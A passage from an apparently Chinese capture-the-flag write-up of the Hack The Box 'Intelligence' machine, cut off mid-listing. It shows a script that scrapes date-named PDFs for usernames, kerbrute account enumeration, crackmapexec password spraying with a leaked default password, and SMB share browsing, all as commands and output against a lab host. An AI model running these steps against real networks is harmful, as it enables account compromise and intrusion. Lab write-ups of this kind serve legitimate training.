<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">Internal IT Update<br>There has recently been some outages on our web servers. Ted has gotten a<br>script in place to help notify us <span class="hljs-keyword">if</span> this happens again.<br>Also, after discussion following our recent security audit we are in the process<br>of locking down our service accounts<br><br>内部IT更新<br>最近我们的网络服务器出现了一些中断。Ted得了一个<br>如果再次发生这种情况，脚本将帮助通知我们。<br>此外，在我们最近的安全审计之后进行了讨论，我们正在进行中<br>锁定我们的服务帐户<br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
<p>9、知道了默认密码，但是还缺少账号信息，这里其实根据上面的PDF文件，我能发现一些账号信息，这里使用writeup里的脚本直接获取吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/env python3<br><br>import datetime<br>import io<br>import PyPDF2<br>import requests<br><br><br>t = datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>end = datetime.datetime(<span class="hljs-number">2021</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>)<br>keywords = [<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;account&#x27;</span>, <span class="hljs-string">&#x27;intelligence&#x27;</span>, <span class="hljs-string">&#x27;htb&#x27;</span>, <span class="hljs-string">&#x27;login&#x27;</span>, <span class="hljs-string">&#x27;service&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>]<br>users = <span class="hljs-built_in">set</span>()<br><br><span class="hljs-keyword">while</span> True:<br>    url = t.strftime(<span class="hljs-string">&quot;http://10.10.10.248/documents/%Y-%m-%d-upload.pdf&quot;</span>)<br>    resp = requests.get(url)<br>    <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:<br>        with io.BytesIO(resp.content) as data:<br>            pdf = PyPDF2.PdfFileReader(data)<br>            users.add(pdf.getDocumentInfo()[<span class="hljs-string">&#x27;/Creator&#x27;</span>])<br>            <span class="hljs-keyword">for</span> page in range(pdf.getNumPages()):<br>                text = pdf.getPage(page).extractText()<br>                <span class="hljs-keyword">if</span> any([k in text.lower() <span class="hljs-keyword">for</span> k in keywords]):<br>                    print(f<span class="hljs-number">&#x27;</span>===&#123;url&#125;===\n&#123;text&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    t = t + datetime.timedelta(days=1)</span><br><span class="hljs-string">    if t &gt;= end:</span><br><span class="hljs-string">        break</span><br><span class="hljs-string"></span><br><span class="hljs-string">with open(&#x27;</span>users<span class="hljs-number">&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) as f:<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(users)) <br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/test]<br>└─$ sudo python3 test.py<br>===http:<span class="hljs-comment">//10.10.10.248/documents/2020-06-04-upload.pdf===</span><br>New Account Guide<br>Welcome to Intelligence Corp!<br>Please login using your username and the <span class="hljs-keyword">default</span> password of:<br>NewIntelligenceCorpUser9876<br>After logging in please change your password as soon as possible.<br>===http:<span class="hljs-comment">//10.10.10.248/documents/2020-12-30-upload.pdf===</span><br>Internal IT Update<br>There has recently been some outages on our web servers. Ted has gotten a<br>script in place to help notify us <span class="hljs-keyword">if</span> this happens again.<br>Also, after discussion following our recent security audit we are in the process<br>of locking down our service accounts.<br><br>┌──(kali㉿offsec)-[~/Desktop/test]<br>└─$ cat users     <br>Stephanie.Young<br>Anita.Roberts<br>Thomas.Valenzuela<br>Brian.Morris<br>Ian.Duncan<br>Daniel.Shelton<br>Scott.Scott<br>David.Reed<br>Jason.Patterson<br>Thomas.Hall<br>Jennifer.Thomas<br>David.Wilson<br>Tiffany.Molina<br>Richard.Williams<br>Kaitlyn.Zimmerman<br>Travis.Evans<br>Brian.Baker<br>William.Lee<br>Jessica.Moody<br>John.Coleman<br>Samuel.Richardson<br>Veronica.Patel<br>Danny.Matthews<br>Jose.Williams<br>David.Mcbride<br>Jason.Wright<br>Teresa.Williamson<br>Kelly.Long<br>Nicole.Brock<br>Darryl.Harris<br></code></pre></td></tr></table></figure>

<p>10、到这里其实账号的有效性，需要我们进行确认，由于靶机是个域环境，故我们可以使用 kerbrute 工具来验证，当前账号是否存在</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/test]<br>└─$ ../tools/kerbrute userenum -d intelligence.htb --dc <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span> users <br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / <span class="hljs-comment">//_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="hljs-comment"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: dev (n/a) - <span class="hljs-number">04</span>/<span class="hljs-number">01</span>/<span class="hljs-number">24</span> - Ronnie Flathers @ropnop<br><br><span class="hljs-number">2024</span>/<span class="hljs-number">04</span>/<span class="hljs-number">01</span> <span class="hljs-number">22</span>:<span class="hljs-number">03</span>:<span class="hljs-number">19</span> &gt;  Using <span class="hljs-title function_">KDC</span><span class="hljs-params">(s)</span>:<br>2024/04/01 22:03:19 &gt;   10.10.10.248:88<br><br>2024/04/01 22:03:19 &gt;  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb<br>2024/04/01 22:03:19 &gt;  [+] VALID USERNAME:       David.Reed@intelligence.htb<br>2024/04/01 22:03:19 &gt;  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb<br>2024/04/01 22:03:19 &gt;  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb<br>2024/04/01 22:03:19 &gt;  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb<br>2024/04/01 22:03:19 &gt;  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb<br>2024/04/01 22:03:19 &gt;  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb<br>2024/04/01 22:03:19 &gt;  [+] VALID USERNAME:       Scott.Scott@intelligence.htb<br>2024/04/01 22:03:19 &gt;  [+] VALID USERNAME:       Brian.Morris@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       David.Wilson@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       Travis.Evans@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       Richard.Williams@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       William.Lee@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       Brian.Baker@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       David.Mcbride@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb<br>2024/04/01 22:03:20 &gt;  [+] VALID USERNAME:       John.Coleman@intelligence.htb<br>2024/04/01 22:03:21 &gt;  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb<br>2024/04/01 22:03:21 &gt;  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb<br>2024/04/01 22:03:25 &gt;  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb<br>2024/04/01 22:03:25 &gt;  [+] VALID USERNAME:       Kelly.Long@intelligence.htb<br>2024/04/01 22:03:25 &gt;  [+] VALID USERNAME:       Jason.Wright@intelligence.htb<br>2024/04/01 22:03:25 &gt;  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb<br>2024/04/01 22:03:25 &gt;  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb<br>2024/04/01 22:03:25 &gt;  [+] VALID USERNAME:       Jose.Williams@intelligence.htb<br>2024/04/01 22:03:25 &gt;  Done! Tested 30 <span class="hljs-title function_">usernames</span> <span class="hljs-params">(<span class="hljs-number">30</span> valid)</span> in 6.406 seconds<br></code></pre></td></tr></table></figure>

<p>11、然后就是使用 crackmapexec 工具来密码尝试破解了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/test]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span> -u users -p <span class="hljs-string">&#x27;NewIntelligenceCorpUser9876&#x27;</span> --<span class="hljs-keyword">continue</span>-on-success<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>

<p>12、这里发现成功了一个账号，那尝试用这个账号来查看下SMB共享的内容吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">[+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -L <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>  -U Tiffany.Molina%<span class="hljs-string">&#x27;NewIntelligenceCorpUser9876&#x27;</span><br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>        IT              Disk      <br>        NETLOGON        Disk      Logon server share <br>        SYSVOL          Disk      Logon server share <br>        Users           Disk      <br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbmap -H <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span> -u Tiffany.Molina -p <span class="hljs-string">&#x27;NewIntelligenceCorpUser9876&#x27;</span><br><br>    ________  ___      ___  _______   ___      ___       __         _______<br>   /<span class="hljs-string">&quot;       )|&quot;</span>  \    /<span class="hljs-string">&quot;  ||   _  &quot;</span>\ |<span class="hljs-string">&quot;  \    /&quot;</span>  |     /<span class="hljs-string">&quot;&quot;</span>\       |   __ <span class="hljs-string">&quot;\</span><br><span class="hljs-string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span><br><span class="hljs-string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span><br><span class="hljs-string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span><br><span class="hljs-string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \<br>  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)<br> -----------------------------------------------------------------------------<br>     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com<br>                     https:<span class="hljs-comment">//github.com/ShawnDEvans/smbmap</span><br><br>[*] Detected <span class="hljs-number">1</span> hosts serving SMB<br>[*] Established <span class="hljs-number">1</span> SMB session(s)                                <br>                                                                                                    <br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>:<span class="hljs-number">445</span>        Name: intelligence.htb          Status: Authenticated<br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        ADMIN$                                                  NO ACCESS       Remote Admin<br>        C$                                                      NO ACCESS       Default share<br>        IPC$                                                    READ ONLY       Remote IPC<br>        IT                                                      READ ONLY<br>        NETLOGON                                                READ ONLY       Logon server share <br>        SYSVOL                                                  READ ONLY       Logon server share <br>        Users                                                   READ ONLY<br></code></pre></td></tr></table></figure>

<p>13、都是只有可读的权限，没有写入的权限，那尝试翻阅下里面的文件吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>\\Users  -U Tiffany.Molina%<span class="hljs-string">&#x27;NewIntelligenceCorpUser9876&#x27;</span><br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>  .                                  DR        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">20</span>:<span class="hljs-number">26</span> <span class="hljs-number">2021</span><br>  ..                                 DR        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">20</span>:<span class="hljs-number">26</span> <span class="hljs-number">2021</span><br>  Administrator                       D        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">18</span>:<span class="hljs-number">39</span> <span class="hljs-number">2021</span><br>  All Users                       DHSrn        <span class="hljs-number">0</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">21</span>:<span class="hljs-number">46</span> <span class="hljs-number">2018</span><br>  Default                           DHR        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">10</span>:<span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-number">2021</span><br>  Default User                    DHSrn        <span class="hljs-number">0</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">21</span>:<span class="hljs-number">46</span> <span class="hljs-number">2018</span><br>  desktop.ini                       AHS      <span class="hljs-number">174</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">11</span>:<span class="hljs-number">27</span> <span class="hljs-number">2018</span><br>  Public                             DR        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">18</span>:<span class="hljs-number">39</span> <span class="hljs-number">2021</span><br>  Ted.Graves                          D        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">20</span>:<span class="hljs-number">26</span> <span class="hljs-number">2021</span><br>  Tiffany.Molina                      D        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br><br>                <span class="hljs-number">3770367</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">1461870</span> blocks available<br>smb: \&gt; cd Tiffany.Molina\<br>smb: \Tiffany.Molina\&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  ..                                  D        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  AppData                            DH        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Application Data                DHSrn        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span 